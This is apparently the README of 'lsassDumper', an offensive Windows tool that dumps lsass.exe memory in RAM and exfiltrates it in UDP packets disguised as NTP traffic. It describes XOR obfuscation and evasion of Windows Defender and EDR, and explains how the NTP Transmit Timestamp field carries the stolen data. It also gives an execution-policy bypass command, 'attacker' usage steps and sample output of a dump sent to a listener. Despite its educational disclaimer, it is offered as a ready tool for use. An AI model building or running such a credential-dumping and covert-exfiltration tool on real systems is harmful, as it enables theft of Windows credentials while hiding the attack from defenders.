<h1 align="center"> Project lsassDumper </h1>

## **🔍 Overview**
`lsassDumper` is an advanced tool designed to ** dump the memory of the Windows process `lsass.exe`** and **exfiltrate** it using **UDP packets disguised as NTP requests**.  
Unlike traditional tools like **Mimikatz**, this tool performs all operations **in RAM**, avoiding detection by **Windows Defender, EDR, and forensic tools**.

The tool consists of:
- A **dumper** `memdump.c` to **extract LSASS memory** in RAM.
- A **sender** that transmits the **compressed dump over UDP (NTP packets)**.
- A **receiver** (`server.py`) that **reassembles the fragments** and **decompresses the memory dump**.

---

## **🛠 Features**
### **🔹 Process Identification**
- The **process name (`lsass.exe`) is obfuscated** in the source code using **XOR encoding** (`0x13` key) to **bypass static detection**.
- **Windows APIs (`CreateToolhelp32Snapshot`)** are used to **enumerate processes and extract the PID** dynamically.

### **🔹 Memory Dumping**
- Uses **MiniDumpWriteDump (from `DbgHelp.dll`)** to dump LSASS **directly into RAM**, **never touching the disk**.
- A **memory-mapped file** acts as a temporary buffer to minimize detection.

### **🔹 Compression (zlib)**
- The **dump is compressed in-memory** using `zlib` before transmission.
- This **reduces size** and makes the exfiltration **less detectable**.

### **🔹 Exfiltration via Fake NTP Packets**
- The **compressed dump is fragmented into small chunks** and sent via **UDP packets disguised as NTP traffic**.
- The **"Transmit Timestamp" field** of the NTP packet is **hijacked** to store **payload fragments**.

### **🔹 Receiver Script**
- A **Python-based receiver** (`receiver.py`) **listens on UDP 123 (NTP)**.
- It **reassembles the fragmented dump**, **decompresses** it, and **writes it to a file**.

---

## **📜 How NTP Packet Camouflage Works**
### **🔹 Normal NTP Packet Structure**
NTP (Network Time Protocol) packets typically contain **48 bytes**, with the last 8 bytes storing the **Transmit Timestamp**.  

```
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|LI | VN  |Mode|    Stratum     |     Poll      |  Precision   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     Root Delay (32-bit)                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                  Root Dispersion (32-bit)                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Reference ID (32-bit)                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                Reference Timestamp (64-bit)                  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                 Originate Timestamp (64-bit)                 |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                  Receive Timestamp (64-bit)                  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                 Transmit Timestamp (64-bit)                  | <-- Exfiltrated Data
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### **🔹 How This Tool Abuses NTP**
- Instead of sending a **valid NTP Transmit Timestamp**, we **embed data in this field**.
- The **first packet** contains a **header**:
  - **4 bytes** → `total number of fragments` (big-endian)
  - **4 bytes** → `total compressed size` (big-endian)
- Each **subsequent packet** contains:
  - **4 bytes** → `fragment sequence number`
  - **4 bytes** → `data fragment`

This **allows memory dump exfiltration under the disguise of legitimate NTP traffic**.

---

## **🚀 Installation & Compilation**
### **🔹 Windows (PowerShell)**
 -- If you have vscode or else configured
 1. Run the following command:
   ```powershell
   Set-ExecutionPolicy Bypass -Scope Process -Force; ./run.ps1
   ```

---

## **🎯 Usage**
### **1️⃣ Run the Dumper (Attacker)**
On **Windows**:
```powershell
.\memdump.exe
```

You will be prompted to **enter the remote server IP and port** for exfiltration.

### **2️⃣ Run the Receiver (Listener)**
On the **attacker machine**, run:
```bash
python3 server.py
```
This will **listen on UDP port 123 (NTP)** and reconstruct the **exfiltrated dump**.

---

## **📌 Example Execution**
### **🟢 Attacker (Dumper)**
```
[*] Enter server IP: 192.168.1.100
[*] Enter server port: 123
[+] Process lsass.exe found with PID 1234
[+] Memory dump completed. Size: 16 MB.
[+] Compression completed. Compressed size: 512 KB.
[+] Header sent: 128 fragments, 512 KB total.
[+] Packet 1/128 sent.
...
[+] Transmission completed.
```

### **🟢 Receiver (Listener)**
```
[INFO] Listening on 0.0.0.0:123 (global timeout: 30s)
[INFO] Header received: 128 fragments, 512 KB compressed size.
[INFO] Receiving packets...
[Reconstitution] [========------] 50% (64/128)
[INFO] All fragments received.
[INFO] Decompressing...
[INFO] Dump saved as dump_memory.bin.
```

---

## **⚠️ Legal Notice**
🚨 **This tool is for EDUCATIONAL and AUTHORIZED TESTING ONLY.**  
Use this tool **only on systems you own or have explicit permission to test**.

---
